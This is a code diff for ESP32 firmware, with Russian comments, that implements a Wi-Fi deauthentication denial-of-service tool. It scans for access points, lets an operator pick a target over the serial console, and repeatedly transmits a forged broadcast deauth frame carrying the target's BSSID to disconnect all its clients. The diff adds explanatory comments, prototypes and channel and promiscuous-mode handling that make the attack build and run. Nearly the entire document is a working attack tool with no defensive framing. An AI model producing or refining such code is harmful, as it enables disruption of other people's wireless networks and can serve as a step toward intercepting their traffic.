@@ -1,6 +1,7 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 
+// Структура для хранения информации о точке доступа
 struct AccessPoint {
   String ssid;
   uint8_t bssid[6];
@@ -8,6 +9,7 @@ struct AccessPoint {
   int rssi;
 };
 
+// Глобальные переменные
 AccessPoint networks[50];
 int networkCount = 0;
 bool attackActive = false;
@@ -15,31 +17,36 @@ uint8_t targetBSSID[6] = {0};
 int targetChannel = 0;
 String targetSSID = "";
 
-// Пакет деаутентификации (тип 0xC0)
+// Пакет деаутентификации (тип 0xC0 - Deauthentication)
 uint8_t deauthPacket[26] = {
-  0xC0, 0x00, 0x00, 0x00,
-  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00,
-  0x01, 0x00
+  0xC0, 0x00, 0x00, 0x00,          // Frame Control (Deauth)
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (заполняется BSSID)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (заполняется)
+  0x00, 0x00,                         // Sequence
+  0x01, 0x00                           // Reason code (1 = unspecified)
 };
+
+// 🔧 ПРОТОТИПЫ ФУНКЦИЙ (обязательно для PlatformIO)
+void scanNetworks();
+void sendDeauthPacket();
 
 void setup() {
   Serial.begin(115200);
   delay(1000);
 
+  // Инициализация WiFi в режиме STA
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
 
+  // Включаем promiscuous режим для отправки сырых пакетов
   esp_wifi_set_promiscuous(true);
   delay(100);
 
   Serial.println("\n[#] ESP32 DoS Ready");
   Serial.println("Commands: scan, set <num>, start, stop");
 }
-
 void loop() {
   if (Serial.available()) {
     String cmd = Serial.readStringUntil('\n');
@@ -87,7 +94,12 @@ void loop() {
 
 void scanNetworks() {
   Serial.println("Scanning...");
+  
+  // Временно отключаем promiscuous для сканирования
+  esp_wifi_set_promiscuous(false);  delay(50);
+  
   networkCount = WiFi.scanNetworks();
+  
   if (networkCount == 0) {
     Serial.println("No networks found");
   } else {
@@ -106,12 +118,25 @@ void scanNetworks() {
     }
   }
   WiFi.scanDelete();
+  
+  // Возвращаем promiscuous режим
+  esp_wifi_set_promiscuous(true);
+  delay(50);
 }
 
 void sendDeauthPacket() {
   if (targetChannel == 0) return;
+  
+  // Переключаемся на канал цели
   esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+  
+  // Заполняем MAC-адреса в пакете (Source и BSSID)
   memcpy(&deauthPacket[10], targetBSSID, 6);
   memcpy(&deauthPacket[16], targetBSSID, 6);
+  
+  // Отправляем пакет через STA интерфейс
   esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+  
+  // Небольшая задержка для стабильности
+  delayMicroseconds(100);
 }
